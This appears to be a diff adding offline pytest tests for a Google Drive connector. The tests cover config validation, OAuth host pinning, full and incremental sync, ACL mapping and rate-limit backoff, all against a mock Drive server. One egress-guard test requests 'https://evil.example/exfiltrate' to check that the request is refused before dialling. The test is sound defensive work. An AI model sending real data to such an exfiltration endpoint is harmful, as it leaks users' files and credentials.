@@ -1,0 +1,557 @@
+"""Google Drive connector tests — offline, MockTransport-backed (#453).
+
+Drives the REAL guarded client (``build_authenticated_client``) against a fake
+Drive REST server behind an ``httpx.MockTransport``: the shared egress
+primitive is stubbed with a public-range answer + a passthrough pin (exactly
+like ``test_authenticated_client_is_host_pinned``), so every test exercises the
+guard ORDER without a socket. Covers ADR-0019 §3/§5:
+
+* config validation (closed mode variants, INV-8);
+* the pinned OAuth spec (hosts, scope, offline-consent params);
+* full sync: start-token-**before**-enumeration, content mapping (Docs/Sheets
+  exports, binary pass-through, oversize + unsupported skips), scope chains,
+  drive-scoped tokens for Shared Drives, ACL-fetch failure ⇒ skip;
+* incremental: page shape (upserts/deletions/stale scopes/integrity), the
+  terminal ``newStartPageToken`` baseline, HTTP 410 ⇒ typed cursor-expired,
+  429/Retry-After backoff;
+* the pinned-host guard (a foreign-host request never dials).
+"""
+
+from __future__ import annotations
+
+import uuid
+from collections.abc import AsyncIterator
+from datetime import UTC, datetime
+from typing import Any
+from urllib.parse import parse_qs
+
+import httpx
+import pytest
+
+import app.net.egress as net_egress
+from app.connectors.base import (
+    AclMappingContext,
+    ConnectorConfigError,
+    CursorExpiredError,
+    FullSyncResult,
+    PageIntegrity,
+    SyncPage,
+)
+from app.connectors.gdrive import CONNECTOR, GdriveConnector
+from app.connectors.gdrive import api as gdrive_api
+from app.connectors.oauth import EgressNotAllowedError, build_authenticated_client
+from app.connectors.registry import registered_types
+from app.domain.entities import Source, SourceStatus
+
+_FOLDER = "application/vnd.google-apps.folder"
+_GDOC = "application/vnd.google-apps.document"
+_GSHEET = "application/vnd.google-apps.spreadsheet"
+
+_ALICE_ID = uuid.uuid4()
+_CTX = AclMappingContext(
+    email_to_user_id={"alice@acme.test": _ALICE_ID},
+    evaluated_at=datetime(2026, 7, 18, tzinfo=UTC),
+)
+
+_READER_ALICE = [{"type": "user", "role": "reader", "emailAddress": "alice@acme.test"}]
+
+
+def _source(config: dict[str, object]) -> Source:
+    now = datetime.now(UTC)
+    return Source(
+        id=uuid.uuid4(),
+        tenant_id=uuid.uuid4(),
+        owner_id=uuid.uuid4(),
+        type="gdrive",
+        config=config,
+        status=SourceStatus.PENDING,
+        indexed_count=0,
+        last_synced_at=None,
+        last_error=None,
+        created_at=now,
+        updated_at=now,
+    )
+
+
+class FakeDrive:
+    """A scriptable Drive REST v3 double served through MockTransport."""
+
+    def __init__(self) -> None:
+        self.files: dict[str, dict[str, Any]] = {}
+        self.children: dict[str, list[str]] = {}  # folder id -> child file ids
+        self.permissions: dict[str, list[dict[str, Any]]] = {}
+        self.perm_fail_ids: set[str] = set()
+        self.exports: dict[str, bytes] = {}
+        self.media: dict[str, bytes] = {}
+        self.start_token = "start-token-1"
+        self.changes_pages: dict[str, dict[str, Any]] = {}
+        self.fail_children_of: set[str] = set()
+        self.rate_limit_next: int = 0  # serve N 429s before succeeding
+        self.calls: list[str] = []  # ordered request paths (with intent tags)
+
+    def add_file(
+        self,
+        file_id: str,
+        *,
+        name: str = "f",
+        mime: str = _GDOC,
+        parents: list[str] | None = None,
+        drive_id: str | None = None,
+        size: str | None = None,
+        inherited_disabled: bool = False,
+        permissions: list[dict[str, Any]] | None = None,
+        export: bytes = b"exported text",
+        media: bytes = b"",
+    ) -> None:
+        meta: dict[str, Any] = {
+            "id": file_id,
+            "name": name,
+            "mimeType": mime,
+            "modifiedTime": "2026-07-18T10:00:00Z",
+        }
+        if parents:
+            meta["parents"] = parents
+            for parent in parents:
+                self.children.setdefault(parent, []).append(file_id)
+        if drive_id:
+            meta["driveId"] = drive_id
+        if size is not None:
+            meta["size"] = size
+        if inherited_disabled:
+            meta["inheritedPermissionsDisabled"] = True
+        self.files[file_id] = meta
+        self.permissions[file_id] = permissions if permissions is not None else list(_READER_ALICE)
+        self.exports[file_id] = export
+        self.media[file_id] = media
+
+    # --- the transport handler ------------------------------------------------
+
+    def handler(self, request: httpx.Request) -> httpx.Response:
+        assert request.url.host == "www.googleapis.com"
+        path = request.url.path
+        params = {k: v[0] for k, v in parse_qs(request.url.query.decode("ascii")).items()}
+        if self.rate_limit_next > 0:
+            self.rate_limit_next -= 1
+            return httpx.Response(429, headers={"Retry-After": "2"})
+        if path == "/drive/v3/changes/startPageToken":
+            self.calls.append(f"startPageToken drive={params.get('driveId')}")
+            return httpx.Response(200, json={"startPageToken": self.start_token})
+        if path == "/drive/v3/changes":
+            token = params.get("pageToken", "")
+            self.calls.append(f"changes token={token} drive={params.get('driveId')}")
+            payload = self.changes_pages.get(token)
+            if payload is None:
+                return httpx.Response(410)
+            return httpx.Response(200, json=payload)
+        if path == "/drive/v3/about":
+            self.calls.append("about")
+            return httpx.Response(200, json={"user": {"emailAddress": "alice@acme.test"}})
+        if path == "/drive/v3/files":
+            query = params.get("q", "")
+            self.calls.append(f"files.list q={query}")
+            if "' in parents" in query:
+                folder_id = query.split("'")[1]
+                if folder_id in self.fail_children_of:
+                    return httpx.Response(500)
+                ids = self.children.get(folder_id, [])
+                return httpx.Response(
+                    200, json={"files": [self.files[i] for i in ids if i in self.files]}
+                )
+            return httpx.Response(200, json={"files": list(self.files.values())})
+        if path.endswith("/permissions"):
+            file_id = path.split("/")[-2]
+            self.calls.append(f"permissions {file_id}")
+            if file_id in self.perm_fail_ids:
+                return httpx.Response(500)
+            return httpx.Response(200, json={"permissions": self.permissions.get(file_id, [])})
+        if path.endswith("/export"):
+            file_id = path.split("/")[-2]
+            self.calls.append(f"export {file_id} mime={params.get('mimeType')}")
+            return httpx.Response(200, content=self.exports.get(file_id, b""))
+        if path.startswith("/drive/v3/files/"):
+            file_id = path.split("/")[-1]
+            if params.get("alt") == "media":
+                self.calls.append(f"download {file_id}")
+                return httpx.Response(200, content=self.media.get(file_id, b""))
+            self.calls.append(f"files.get {file_id}")
+            meta = self.files.get(file_id)
+            if meta is None:
+                return httpx.Response(404)
+            return httpx.Response(200, json=meta)
+        raise AssertionError(f"unexpected Drive path: {path}")
+
+
+@pytest.fixture
+def fake_drive() -> FakeDrive:
+    return FakeDrive()
+
+
+@pytest.fixture
+def guard_stub(monkeypatch: pytest.MonkeyPatch) -> None:
+    """Public-range resolve + passthrough pin so the REAL guard runs offline."""
+    monkeypatch.setattr(net_egress, "resolve_safe_ip", lambda host: "142.250.4.95")
+    monkeypatch.setattr(net_egress, "pin_url_to_ip", lambda url, ip: url)
+
+
+def _client(fake: FakeDrive) -> httpx.AsyncClient:
+    return build_authenticated_client(
+        GdriveConnector().oauth_spec(),
+        access_token="tok",
+        timeout=5.0,
+        inner_transport=httpx.MockTransport(fake.handler),
+    )
+
+
+class _Run:
+    """A minimal ConnectorRun stand-in (frozen dataclass shape not required)."""
+
+    def __init__(self, http: httpx.AsyncClient, ctx: AclMappingContext | None = _CTX) -> None:
+        self.http = http
+        self.acl_context = ctx
+
+
+async def _drain(pages: AsyncIterator[SyncPage]) -> list[SyncPage]:
+    return [page async for page in pages]
+
+
+# --- discovery + config -------------------------------------------------------
+
+
+def test_registry_discovers_gdrive() -> None:
+    assert "gdrive" in registered_types()
+
+
+def test_validate_config_closed_variants() -> None:
+    c = GdriveConnector()
+    assert c.validate_config({"mode": "my_drive"}) == {"mode": "my_drive"}
+    assert c.validate_config({"mode": "folder", "folder_id": "f1"}) == {
+        "mode": "folder",
+        "folder_id": "f1",
+    }
+    assert c.validate_config({"mode": "folder", "folder_id": "f1", "drive_id": "d1"}) == {
+        "mode": "folder",
+        "folder_id": "f1",
+        "drive_id": "d1",
+    }
+    assert c.validate_config({"mode": "shared_drive", "drive_id": "d1"}) == {
+        "mode": "shared_drive",
+        "drive_id": "d1",
+    }
+
+
+@pytest.mark.parametrize(
+    "config",
+    [
+        {"mode": "nope"},
+        {},
+        {"mode": "my_drive", "folder_id": "f1"},
+        {"mode": "my_drive", "drive_id": "d1"},
+        {"mode": "folder"},
+        {"mode": "folder", "folder_id": ""},
+        {"mode": "shared_drive"},
+        {"mode": "shared_drive", "drive_id": ""},
+        {"mode": "shared_drive", "drive_id": "d1", "folder_id": "f1"},
+    ],
+)
+def test_validate_config_rejections(config: dict[str, object]) -> None:
+    with pytest.raises(ConnectorConfigError) as exc:
+        GdriveConnector().validate_config(config)
+    assert exc.value.code == "invalid_config"
+
+
+def test_oauth_spec_is_pinned_to_google() -> None:
+    from app.core.config import get_settings
+
+    spec = CONNECTOR.oauth_spec()
+    assert spec.authorize_url == "https://accounts.google.com/o/oauth2/v2/auth"
+    assert spec.token_url == "https://oauth2.googleapis.com/token"
+    assert spec.scopes == ("https://www.googleapis.com/auth/drive.readonly",)
+    assert spec.allowed_hosts == (
+        "accounts.google.com",
+        "oauth2.googleapis.com",
+        "www.googleapis.com",
+    )
+    assert spec.extra_authorize_params == {"access_type": "offline", "prompt": "consent"}
+    assert spec.client_id == get_settings().gdrive_oauth_client_id
+    assert spec.client_secret == get_settings().gdrive_oauth_client_secret
+
+
+# --- the pinned-host guard ----------------------------------------------------
+
+
+async def test_foreign_host_request_is_refused_before_dial(
+    guard_stub: None, fake_drive: FakeDrive
+) -> None:
+    """ADR-0009 §3 bar: a request leaving the pinned host set is a defect —
+    the guard refuses it before any bytes (or the bearer) leave."""
+    async with _client(fake_drive) as http:
+        with pytest.raises(EgressNotAllowedError):
+            await http.get("https://evil.example/exfiltrate")
+    assert fake_drive.calls == []  # nothing ever dialled
+
+
+async def test_fetch_account_email_uses_about_get(guard_stub: None, fake_drive: FakeDrive) -> None:
+    async with _client(fake_drive) as http:
+        email = await CONNECTOR.fetch_account_email(http)
+    assert email == "alice@acme.test"
+
+
+# --- full sync ----------------------------------------------------------------
+
+
+async def test_full_sync_captures_start_token_before_enumeration(
+    guard_stub: None, fake_drive: FakeDrive
+) -> None:
+    fake_drive.add_file("doc1", name="Doc One", mime=_GDOC, export=b"hello world")
+    async with _client(fake_drive) as http:
+        result = await CONNECTOR.sync(_source({"mode": "my_drive"}), _Run(http))  # type: ignore[arg-type]
+    assert isinstance(result, FullSyncResult)
+    assert result.baseline_cursor == "start-token-1"
+    first_list = next(i for i, c in enumerate(fake_drive.calls) if c.startswith("files.list"))
+    token_call = next(i for i, c in enumerate(fake_drive.calls) if c.startswith("startPageToken"))
+    assert token_call < first_list, "the start token must be captured BEFORE enumeration"
+
+
+async def test_full_sync_content_mapping_and_skips(guard_stub: None, fake_drive: FakeDrive) -> None:
+    fake_drive.add_file("doc1", name="Doc", mime=_GDOC, export=b"doc text")
+    fake_drive.add_file("sheet1", name="Sheet", mime=_GSHEET, export=b"a,b\n1,2\n")
+    fake_drive.add_file(
+        "pdf1", name="Deck.pdf", mime="application/pdf", size="10", media=b"%PDF-1.7 x"
+    )
+    fake_drive.add_file("big1", name="Huge.pdf", mime="application/pdf", size="999999999999")
+    fake_drive.add_file("img1", name="Pic.png", mime="image/png")
+    async with _client(fake_drive) as http:
+        result = await CONNECTOR.sync(_source({"mode": "my_drive"}), _Run(http))  # type: ignore[arg-type]
+    assert isinstance(result, FullSyncResult)
+    by_id = {d.external_id: d for d in result.docs}
+    assert set(by_id) == {"doc1", "sheet1", "pdf1"}
+    assert by_id["doc1"].text == "doc text" and by_id["doc1"].data is None
+    assert by_id["doc1"].mime_type == "text/plain"
+    assert by_id["sheet1"].text == "a,b\n1,2\n"  # CSV flatten, carried as text
+    assert by_id["pdf1"].data == b"%PDF-1.7 x"
+    assert by_id["pdf1"].mime_type == "application/pdf"
+    # Oversize + unsupported are skipped AND counted (sync health).
+    assert result.skipped_count == 2
+    # Sheets exported as CSV (the requested export mime).
+    assert any("export sheet1 mime=text/csv" in c for c in fake_drive.calls)
+    # Every emitted doc carries the mapped mirror.
+    for doc in result.docs:
+        assert doc.acl is not None
+        assert doc.acl.principals == frozenset({f"user:{_ALICE_ID}"})
+
+
+async def test_full_sync_scope_chain_carries_drive_and_ancestors(
+    guard_stub: None, fake_drive: FakeDrive
+) -> None:
+    fake_drive.add_file("root", name="Root", mime=_FOLDER, drive_id="drv1")
+    fake_drive.add_file("sub", name="Sub", mime=_FOLDER, parents=["root"], drive_id="drv1")
+    fake_drive.add_file(
+        "doc1", name="Deep", mime=_GDOC, parents=["sub"], drive_id="drv1", export=b"x"
+    )
+    async with _client(fake_drive) as http:
+        result = await CONNECTOR.sync(
+            _source({"mode": "shared_drive", "drive_id": "drv1"}),
+            _Run(http),  # type: ignore[arg-type]
+        )
+    assert isinstance(result, FullSyncResult)
+    [doc] = list(result.docs)
+    assert doc.acl is not None
+    assert doc.acl.scope_ids == frozenset({"drv1", "sub", "root"})
+    # Shared-drive mode: the start token is DRIVE-scoped (ADR-0019 §3).
+    assert any(c == "startPageToken drive=drv1" for c in fake_drive.calls)
+
+
+async def test_full_sync_acl_fetch_failure_skips_document(
+    guard_stub: None, fake_drive: FakeDrive
+) -> None:
+    """A permissions fetch that keeps failing ⇒ the document is skipped this
+    sync (never ingested with unknown rights) and counted."""
+    fake_drive.add_file("doc1", name="Ok", mime=_GDOC, export=b"x")
+    fake_drive.add_file("doc2", name="Broken", mime=_GDOC, export=b"y")
+    fake_drive.perm_fail_ids.add("doc2")
+    async with _client(fake_drive) as http:
+        result = await CONNECTOR.sync(_source({"mode": "my_drive"}), _Run(http))  # type: ignore[arg-type]
+    assert isinstance(result, FullSyncResult)
+    assert [d.external_id for d in result.docs] == ["doc1"]
+    assert result.skipped_count == 1
+
+
+async def test_folder_mode_enumerates_subtree_only(guard_stub: None, fake_drive: FakeDrive) -> None:
+    fake_drive.add_file("watch", name="Watched", mime=_FOLDER, parents=["above"])
+    fake_drive.files["above"] = {"id": "above", "name": "Above", "mimeType": _FOLDER}
+    fake_drive.add_file("in1", name="Inside", mime=_GDOC, parents=["watch"], export=b"x")
+    fake_drive.add_file("out1", name="Outside", mime=_GDOC, parents=["above"], export=b"y")
+    async with _client(fake_drive) as http:
+        result = await CONNECTOR.sync(
+            _source({"mode": "folder", "folder_id": "watch"}),
+            _Run(http),  # type: ignore[arg-type]
+        )
+    assert isinstance(result, FullSyncResult)
+    assert [d.external_id for d in result.docs] == ["in1"]
+    [doc] = list(result.docs)
+    assert doc.acl is not None
+    # The chain watches the sync root AND its upward ancestors.
+    assert {"watch", "above"} <= set(doc.acl.scope_ids)
+
+
+# --- incremental sync ---------------------------------------------------------
+
+
+async def test_fetch_changes_pages_deletions_and_upserts(
+    guard_stub: None, fake_drive: FakeDrive
+) -> None:
+    fake_drive.add_file("doc1", name="Changed", mime=_GDOC, export=b"new text")
+    fake_drive.changes_pages = {
+        "cur-1": {
+            "changes": [
+                {"changeType": "file", "fileId": "gone1", "removed": True},
+                {"changeType": "file", "fileId": "doc1", "file": fake_drive.files["doc1"]},
+            ],
+            "nextPageToken": "cur-2",
+        },
+        "cur-2": {
+            "changes": [
+                {
+                    "changeType": "file",
+                    "fileId": "trash1",
+                    "file": {"id": "trash1", "mimeType": _GDOC, "trashed": True},
+                },
+            ],
+            "newStartPageToken": "baseline-9",
+        },
+    }
+    async with _client(fake_drive) as http:
+        pages = await _drain(
+            CONNECTOR.fetch_changes(_source({"mode": "my_drive"}), "cur-1", _Run(http))  # type: ignore[arg-type]
+        )
+    assert len(pages) == 2
+    first, last = pages
+    assert first.deleted_external_ids == frozenset({"gone1"})
+    assert [d.external_id for d in first.upserts] == ["doc1"]
+    assert first.next_cursor == "cur-2"  # per-page resume point
+    assert first.integrity is PageIntegrity.COMPLETE
+    assert last.deleted_external_ids == frozenset({"trash1"})
+    assert last.next_cursor == "baseline-9"  # the drained replay's new baseline
+
+
+async def test_fetch_changes_folder_change_yields_stale_scope_and_reexamines(
+    guard_stub: None, fake_drive: FakeDrive
+) -> None:
+    fake_drive.add_file("fold1", name="Folder", mime=_FOLDER)
+    fake_drive.add_file("child1", name="Child", mime=_GDOC, parents=["fold1"], export=b"c")
+    fake_drive.changes_pages = {
+        "cur-1": {
+            "changes": [
+                {"changeType": "file", "fileId": "fold1", "file": fake_drive.files["fold1"]},
+            ],
+            "newStartPageToken": "baseline-2",
+        }
+    }
+    async with _client(fake_drive) as http:
+        pages = await _drain(
+            CONNECTOR.fetch_changes(_source({"mode": "my_drive"}), "cur-1", _Run(http))  # type: ignore[arg-type]
+        )
+    [page] = pages
+    assert page.stale_scope_ids == frozenset({"fold1"})
+    assert page.integrity is PageIntegrity.COMPLETE
+    # The run re-examines the container's descendants in the same page.
+    assert [d.external_id for d in page.upserts] == ["child1"]
+
+
+async def test_fetch_changes_drive_change_scopes_by_drive_id(
+    guard_stub: None, fake_drive: FakeDrive
+) -> None:
+    fake_drive.changes_pages = {
+        "cur-1": {
+            "changes": [{"changeType": "drive", "driveId": "drv1"}],
+            "newStartPageToken": "baseline-3",
+        }
+    }
+    async with _client(fake_drive) as http:
+        pages = await _drain(
+            CONNECTOR.fetch_changes(
+                _source({"mode": "shared_drive", "drive_id": "drv1"}),
+                "cur-1",
+                _Run(http),  # type: ignore[arg-type]
+            )
+        )
+    [page] = pages
+    assert "drv1" in page.stale_scope_ids
+    # Drive-scoped change log (ADR-0019 §3): the token request carries driveId.
+    assert any(c.startswith("changes token=cur-1 drive=drv1") for c in fake_drive.calls)
+
+
+async def test_fetch_changes_unprovable_effects_mark_incomplete(
+    guard_stub: None, fake_drive: FakeDrive
+) -> None:
+    """A live change without file metadata cannot prove its cascade effects —
+    the page fails closed with integrity=incomplete."""
+    fake_drive.changes_pages = {
+        "cur-1": {
+            "changes": [{"changeType": "file", "fileId": "mystery1"}],
+            "newStartPageToken": "baseline-4",
+        }
+    }
+    async with _client(fake_drive) as http:
+        pages = await _drain(
+            CONNECTOR.fetch_changes(_source({"mode": "my_drive"}), "cur-1", _Run(http))  # type: ignore[arg-type]
+        )
+    [page] = pages
+    assert page.integrity is PageIntegrity.INCOMPLETE
+
+
+async def test_fetch_changes_enumeration_failure_marks_incomplete(
+    guard_stub: None, fake_drive: FakeDrive
+) -> None:
+    """Descendant enumeration failing mid-cascade ⇒ the affected set is
+    unprovable ⇒ integrity=incomplete (source-wide stamp downstream)."""
+    fake_drive.add_file("fold1", name="Folder", mime=_FOLDER)
+    fake_drive.fail_children_of.add("fold1")
+    fake_drive.changes_pages = {
+        "cur-1": {
+            "changes": [
+                {"changeType": "file", "fileId": "fold1", "file": fake_drive.files["fold1"]},
+            ],
+            "newStartPageToken": "baseline-5",
+        }
+    }
+    async with _client(fake_drive) as http:
+        pages = await _drain(
+            CONNECTOR.fetch_changes(_source({"mode": "my_drive"}), "cur-1", _Run(http))  # type: ignore[arg-type]
+        )
+    [page] = pages
+    assert page.stale_scope_ids == frozenset({"fold1"})
+    assert page.integrity is PageIntegrity.INCOMPLETE
+
+
+async def test_fetch_changes_410_raises_typed_cursor_expired(
+    guard_stub: None, fake_drive: FakeDrive
+) -> None:
+    async with _client(fake_drive) as http:
+        with pytest.raises(CursorExpiredError):
+            await _drain(
+                CONNECTOR.fetch_changes(
+                    _source({"mode": "my_drive"}),
+                    "unknown-cursor",
+                    _Run(http),  # type: ignore[arg-type]
+                )
+            )
+
+
+# --- 429 backoff --------------------------------------------------------------
+
+
+async def test_429_backoff_honours_retry_after(
+    guard_stub: None, fake_drive: FakeDrive, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    slept: list[float] = []
+
+    async def _sleep(seconds: float) -> None:
+        slept.append(seconds)
+
+    monkeypatch.setattr(gdrive_api.asyncio, "sleep", _sleep)
+    fake_drive.rate_limit_next = 2
+    async with _client(fake_drive) as http:
+        email = await CONNECTOR.fetch_account_email(http)
+    assert email == "alice@acme.test"
+    assert slept == [2.0, 2.0]  # the Retry-After header, honoured per attempt
